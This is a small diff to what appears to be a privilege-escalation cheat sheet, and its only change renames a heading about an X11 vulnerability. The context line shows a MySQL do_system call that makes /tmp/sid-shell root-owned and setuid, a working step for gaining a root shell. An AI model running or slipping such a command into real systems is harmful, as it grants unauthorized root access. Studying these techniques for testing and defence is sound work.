@@ -76,7 +76,7 @@
 | select do_system('chown root:root /tmp/sid-shell; chmod +s /tmp/sid-shell'); |
 
 
-### X Window Commond Vulnerability
+### X 11  Commond Vulnerability
 
 | How To Do   |
 | ------------- |
